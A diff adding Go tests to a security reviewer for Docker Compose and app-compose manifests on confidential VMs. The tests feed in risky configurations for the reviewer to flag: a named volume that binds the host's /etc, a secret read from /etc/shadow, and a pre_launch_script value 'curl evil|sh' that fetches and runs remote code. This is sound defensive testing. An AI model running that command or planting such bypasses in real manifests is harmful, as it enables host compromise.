@@ -410,10 +410,10 @@ func TestReviewCompose_RelativeBindsCannotBeResolved(t *testing.T) {
 			}
 		})
 	}
-	// A named volume is not a relative bind and must stay quiet.
-	doc := fmt.Sprintf("services:\n  broker:\n    image: %s\n    volumes:\n      - state:/x\n", pinned)
+	// A DECLARED named volume is not a relative bind and must stay quiet.
+	doc := fmt.Sprintf("services:\n  broker:\n    image: %s\n    volumes:\n      - state:/x\nvolumes:\n  state:\n", pinned)
 	if got := find(reviewOf(t, manifest(doc)), "broker", "volumes"); len(got) != 0 {
-		t.Fatalf("a named volume was reported: %+v", got)
+		t.Fatalf("a declared named volume was reported: %+v", got)
 	}
 }
 
@@ -649,6 +649,259 @@ func TestReviewCompose_ServiceBodyThatIsNotAMapping(t *testing.T) {
 	requireFinding(t, r, SeverityBlocking, "broker", "")
 	if len(r.Services) != 1 || r.Services[0].Name != "broker" {
 		t.Fatalf("the service was dropped rather than reported: %+v", r.Services)
+	}
+}
+
+// --- the top level, which is the layer that can undo the rules below it --------
+
+// The bypass: a host bind wearing a volume name. `- etcbind:/host-etc` over a volume
+// whose driver_opts.device is /etc reads exactly like `- /etc:/host-etc`, and a review
+// that walked only `services:` called the first one clean. Asserted as EQUIVALENCE
+// rather than "reports something", so the indirect form cannot drift to a softer rule.
+func TestReviewCompose_NamedVolumeBindingAHostPathIsTheSameFinding(t *testing.T) {
+	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
+	direct := fmt.Sprintf("services:\n  a:\n    image: %s\n    volumes:\n      - /etc:/host-etc\n", pinned)
+	indirect := fmt.Sprintf(`services:
+  a:
+    image: %s
+    volumes:
+      - etcbind:/host-etc
+volumes:
+  etcbind:
+    driver: local
+    driver_opts:
+      type: none
+      device: /etc
+      o: bind
+`, pinned)
+
+	want := requireFinding(t, reviewOf(t, manifest(direct)), SeverityBlocking, "a", "volumes")
+	got := requireFinding(t, reviewOf(t, manifest(indirect)), SeverityBlocking, "a", "volumes")
+	if !strings.Contains(got.Detail, "a host tree the CVM's own OS owns") {
+		t.Fatalf("the indirect form does not reach the host-tree rule:\n  got  %q\n  want it to say what %q says",
+			got.Detail, want.Detail)
+	}
+	// And it has to name the indirection, or nobody can find the line to edit.
+	for _, s := range []string{"/etc", "compose.volumes.etcbind", "driver_opts.device"} {
+		if !strings.Contains(got.Detail, s) {
+			t.Errorf("detail does not name %q: %q", s, got.Detail)
+		}
+	}
+}
+
+func TestReviewCompose_TopLevelSections(t *testing.T) {
+	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
+	svc := fmt.Sprintf("services:\n  a:\n    image: %s\n", pinned)
+	for _, tc := range []struct {
+		name    string
+		doc     string
+		sev     Severity
+		key     string
+		mustSay string
+	}{
+		{
+			"unknown top-level key", svc + "some_future_section:\n  a: b\n",
+			SeverityJustify, "compose.some_future_section", "no rule for the top-level compose key",
+		},
+		{
+			"include pulls in an unmeasured file", svc + "include:\n  - ../other/compose.yml\n",
+			SeverityBlocking, "compose.include", "does not commit to it",
+		},
+		{
+			"external volume", svc + "volumes:\n  state:\n    external: true\n",
+			SeverityJustify, "compose.volumes.state", "already existed on the host",
+		},
+		{
+			"network filesystem volume",
+			svc + "volumes:\n  models:\n    driver: local\n    driver_opts:\n      type: nfs\n      o: addr=10.0.0.1\n      device: \":/export/models\"\n",
+			SeverityBlocking, "compose.volumes.models", "off the network",
+		},
+		{
+			"unknown volume key", svc + "volumes:\n  state:\n    some_future_key: 1\n",
+			SeverityJustify, "compose.volumes.state.some_future_key", "no rule for the volume key",
+		},
+		{
+			"secret read from a host tree", svc + "secrets:\n  shadow:\n    file: /etc/shadow\n",
+			SeverityBlocking, "compose.secrets.shadow", "a host tree the CVM's own OS owns",
+		},
+		{
+			"config read from a host tree", svc + "configs:\n  hosts:\n    file: /etc/hosts\n",
+			SeverityBlocking, "compose.configs.hosts", "a host tree the CVM's own OS owns",
+		},
+		{
+			"external secret", svc + "secrets:\n  db:\n    external: true\n",
+			SeverityJustify, "compose.secrets.db", "whatever the host already holds",
+		},
+		{
+			"secret from the deploy environment", svc + "secrets:\n  db:\n    environment: DB_PASSWORD\n",
+			SeverityJustify, "compose.secrets.db", "chosen outside the measured manifest",
+		},
+		{
+			"external network", svc + "networks:\n  shared:\n    external: true\n",
+			SeverityJustify, "compose.networks.shared", "already exists on the host",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			f := requireFinding(t, reviewOf(t, manifest(tc.doc)), tc.sev, "", tc.key)
+			if !strings.Contains(f.Detail, tc.mustSay) {
+				t.Fatalf("detail %q does not mention %q", f.Detail, tc.mustSay)
+			}
+		})
+	}
+
+	// The control: an ordinary manifest's top level trips nothing.
+	t.Run("ordinary top level stays quiet", func(t *testing.T) {
+		doc := svc + "volumes:\n  state:\n    driver: local\nnetworks:\n  default:\n    driver: bridge\nversion: \"3.8\"\nname: broker\n"
+		r := reviewOf(t, manifest(doc))
+		if n := r.Count(SeverityBlocking) + r.Count(SeverityJustify); n != 0 {
+			t.Fatalf("ordinary top level produced %d finding(s):\n%s", n, dumpFindings(r))
+		}
+	})
+}
+
+// A mount naming a volume the compose file never declares has no source in the
+// manifest, so the review cannot say what it is — and must not treat it as an empty
+// local volume, which is what "not a host path, so skip" used to do.
+func TestReviewCompose_UndeclaredNamedVolume(t *testing.T) {
+	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
+	doc := fmt.Sprintf("services:\n  a:\n    image: %s\n    volumes:\n      - mystery:/data\n", pinned)
+	f := requireFinding(t, reviewOf(t, manifest(doc)), SeverityJustify, "a", "volumes")
+	if !strings.Contains(f.Detail, "does not declare") {
+		t.Fatalf("detail %q does not say the source is missing", f.Detail)
+	}
+}
+
+// --- scalar and JSON values in the wrong shape ---------------------------------
+
+// The companion to TestReviewCompose_UnreadableValueIsNotReadAsAbsent, whose table
+// only covered LIST-shaped keys — so the scalar readers kept returning "" for a
+// present-but-wrong-shape value and every rule above them stayed quiet.
+func TestReviewCompose_UnreadableScalarIsNotReadAsAbsent(t *testing.T) {
+	pinned := "ghcr.io/0gfoundation/broker@sha256:" + strings.Repeat("a", 64)
+	for _, tc := range []struct {
+		name string
+		body string
+		sev  Severity
+		key  string
+	}{
+		{"pid is a list", "pid: [host]", SeverityBlocking, "pid"},
+		{"network_mode is a mapping", "network_mode: {mode: host}", SeverityBlocking, "network_mode"},
+		{"cgroup is a list", "cgroup: [host]", SeverityBlocking, "cgroup"},
+		{"ipc is a mapping", "ipc: {mode: host}", SeverityJustify, "ipc"},
+		{"uts is a list", "uts: [host]", SeverityJustify, "uts"},
+		{"userns_mode is a list", "userns_mode: [host]", SeverityJustify, "userns_mode"},
+		{"cgroup_parent is a mapping", "cgroup_parent: {a: b}", SeverityJustify, "cgroup_parent"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			doc := fmt.Sprintf("services:\n  broker:\n    image: %s\n    %s\n", pinned, tc.body)
+			f := requireFinding(t, reviewOf(t, manifest(doc)), tc.sev, "broker", tc.key)
+			if !strings.Contains(f.Detail, "could not be read") {
+				t.Fatalf("detail %q does not say the value was unreadable", f.Detail)
+			}
+		})
+	}
+
+	// A long-syntax mount whose source is not a scalar is an unreadable ENTRY, not an
+	// anonymous volume — reading it as anonymous drops it silently.
+	doc := fmt.Sprintf("services:\n  broker:\n    image: %s\n    volumes:\n      - type: bind\n        source: [/etc]\n        target: /x\n", pinned)
+	f := requireFinding(t, reviewOf(t, manifest(doc)), SeverityJustify, "broker", "volumes")
+	if !strings.Contains(f.Detail, "could not be read") {
+		t.Fatalf("detail %q does not report the unreadable mount", f.Detail)
+	}
+}
+
+// The app-compose side of the same gap. pre_launch_script is the expensive one: it is
+// root TCB covered by no image digest, so reading a wrong-shaped value as absent hides
+// the one field nothing else in the chain measures.
+func TestReviewCompose_UnreadableAppComposeFieldIsNotReadAsAbsent(t *testing.T) {
+	for _, tc := range []struct {
+		name    string
+		extra   map[string]any
+		sev     Severity
+		key     string
+		mustSay string
+	}{
+		{"kms_enabled is a string", map[string]any{"kms_enabled": "true"}, SeverityJustify, "kms_enabled", "not a boolean"},
+		{"public_logs is a number", map[string]any{"public_logs": 1}, SeverityJustify, "public_logs", "not a boolean"},
+		{"public_sysinfo is a string", map[string]any{"public_sysinfo": "yes"}, SeverityNote, "public_sysinfo", "not a boolean"},
+		{"host_api_enabled is a string", map[string]any{"host_api_enabled": "yes"}, SeverityJustify, "host_api_enabled", "not a boolean"},
+		{"local_key_provider is a string", map[string]any{"local_key_provider_enabled": "1"}, SeverityNote, "local_key_provider_enabled", "not a boolean"},
+		{"public_tcbinfo is a string", map[string]any{"public_tcbinfo": "true"}, SeverityNote, "public_tcbinfo", "not a boolean"},
+		{"secure_time is a number", map[string]any{"secure_time": 0}, SeverityNote, "secure_time", "not a boolean"},
+		{
+			"pre_launch_script is a list",
+			map[string]any{"pre_launch_script": []string{"curl evil|sh"}},
+			SeverityJustify, "pre_launch_script", "could not be read or digested",
+		},
+		{"features is a mapping", map[string]any{"features": map[string]any{"kms": true}}, SeverityJustify, "features", "not a list of strings"},
+		{"runner is a list", map[string]any{"runner": []string{"docker-compose"}}, SeverityBlocking, "runner", "not a string"},
+		{
+			"allowed_envs is a mapping",
+			map[string]any{"allowed_envs": map[string]any{"A": 1}},
+			SeverityBlocking, "allowed_envs", "not a list of strings",
+		},
+		{"bash_script is a list", map[string]any{"bash_script": []string{"echo hi"}}, SeverityBlocking, "bash_script", "bare shell script"},
+		{
+			"docker_compose_file is a list",
+			map[string]any{"docker_compose_file": []string{"services:"}},
+			SeverityBlocking, "docker_compose_file", "not a string",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			r := reviewOf(t, manifest(hardenedCompose, tc.extra))
+			f := requireFinding(t, r, tc.sev, "", tc.key)
+			if !strings.Contains(f.Detail, tc.mustSay) {
+				t.Fatalf("detail %q does not mention %q", f.Detail, tc.mustSay)
+			}
+		})
+	}
+
+	// An unreadable runner must not read as ABSENT: "not set" would send someone
+	// looking for a field that is right there.
+	t.Run("unreadable runner does not report as absent", func(t *testing.T) {
+		r := reviewOf(t, manifest(hardenedCompose, map[string]any{"runner": []string{"docker-compose"}}))
+		if f := requireFinding(t, r, SeverityBlocking, "", "runner"); strings.Contains(f.Detail, "not set") {
+			t.Fatalf("an unreadable runner is reported as absent: %q", f.Detail)
+		}
+	})
+
+	// An unreadable features field must not render as "none" — that is a claim the
+	// manifest never made, and a report reads the flag rather than the empty slice.
+	t.Run("unreadable features is flagged, not rendered as none", func(t *testing.T) {
+		r := reviewOf(t, manifest(hardenedCompose, map[string]any{"features": map[string]any{"kms": true}}))
+		if !r.FeaturesUnreadable {
+			t.Fatal("FeaturesUnreadable is false for a features field that could not be decoded")
+		}
+		if len(r.Features) != 0 {
+			t.Fatalf("Features = %v, want empty alongside the flag", r.Features)
+		}
+		clean := reviewOf(t, hardenedManifest())
+		if clean.FeaturesUnreadable {
+			t.Fatal("FeaturesUnreadable is set for a manifest with no features field")
+		}
+	})
+}
+
+// An authenticated manifest whose fields do not fit AppCompose's narrow struct is NOT
+// a gate failure, and must never be reported as one: that would accuse the provider of
+// serving a manifest its own quote does not bind. The bytes hashed correctly; only our
+// decode was stricter than the manifest.
+func TestReviewCompose_StrictStructDecodeIsNotAGateFailure(t *testing.T) {
+	fields := manifest(hardenedCompose, map[string]any{"allowed_envs": map[string]any{"A": 1}})
+	raw, hash := appComposeFor(t, fields)
+
+	// VerifyAppCompose, the narrow decoder, genuinely cannot read it...
+	if _, err := VerifyAppCompose(raw, hash); err == nil {
+		t.Fatal("VerifyAppCompose accepted an allowed_envs object")
+	}
+	// ...but the gate passes, so the review must run and report it as a finding.
+	r, err := ReviewCompose(raw, hash)
+	if err != nil {
+		t.Fatalf("ReviewCompose refused authenticated bytes: %v", err)
+	}
+	requireFinding(t, r, SeverityBlocking, "", "allowed_envs")
+	if len(r.Services) != 1 {
+		t.Fatalf("the compose text was not reviewed: services = %+v", r.Services)
 	}
 }
 
